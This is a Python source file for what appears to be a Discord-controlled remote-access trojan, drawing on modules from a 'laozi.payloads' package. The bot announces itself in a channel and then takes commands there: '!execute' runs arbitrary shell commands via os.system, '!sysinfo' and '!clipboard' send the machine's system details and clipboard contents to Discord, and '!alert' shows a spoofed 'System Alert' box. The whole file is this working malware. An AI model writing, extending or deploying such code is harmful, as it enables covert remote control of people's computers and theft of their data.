import os

import discord

from laozi.payloads.systeminfo import get_sys_info
from laozi.payloads.clipboard import get_clipboard
from laozi.payloads.messagebox import display_messagebox


def load_environment_variables(file_path="../.env"):
    with open(file_path) as env_file:
        for line in env_file:
            line = line.strip()
            if line and not line.startswith("#"):
                key, value = line.split("=", 1)
                os.environ[key.strip()] = value.strip()


class DiscordBotClient(discord.Client):
    def __init__(self, target_channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = target_channel_id

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel:
            await channel.send("@everyone Hello!")
        else:
            print(f"Channel with ID {self.target_channel_id} not found.")

    async def on_message(self, message):
        if message.author == self.user:
            return

        command = message.content.lower()

        if command == "!sysinfo":
            await self.handle_system_info(message.channel)
        elif command.startswith("!execute"):
            self.execute_shell_command(command[9:])
        elif command.startswith("!alert"):
            self.trigger_messagebox(command[7:])
        elif command.startswith("!clipboard"):
            await self.handle_clipboard(message.channel)

    async def handle_system_info(self, channel):
        system_info = get_sys_info()
        basic_info, detailed_info = self.split_system_info(system_info)

        with open("detailed_sys_info.txt", "w") as detailed_file:
            detailed_file.write(detailed_info)

        await channel.send(f"```{basic_info}```")
        await channel.send(file=discord.File("detailed_sys_info.txt"))
        os.remove("detailed_sys_info.txt")

    async def handle_clipboard(self, channel):
        clipboard_content = get_clipboard()
        if clipboard_content:
            await channel.send(f"Clipboard content:\n```{clipboard_content}```")
        else:
            await channel.send("Clipboard is empty or unavailable.")

    @staticmethod
    def split_system_info(system_info):
        lines = system_info.split("\n")
        basic_info = "\n".join(lines[:7])
        detailed_info = "\n".join(lines[7:])
        return basic_info, detailed_info

    @staticmethod
    def execute_shell_command(command):
        os.system(command)

    @staticmethod
    def trigger_messagebox(message_text):
        display_messagebox(message_text, "System Alert", "info")


if __name__ == '__main__':
    load_environment_variables()
    bot_token = os.getenv("DISCORD_BOT_TOKEN")
    channel_id = int(os.getenv("CHANNEL_ID"))

    bot_intents = discord.Intents.default()
    bot_intents.message_content = True

    discord_client = DiscordBotClient(target_channel_id=channel_id, intents=bot_intents)
    discord_client.run(bot_token)
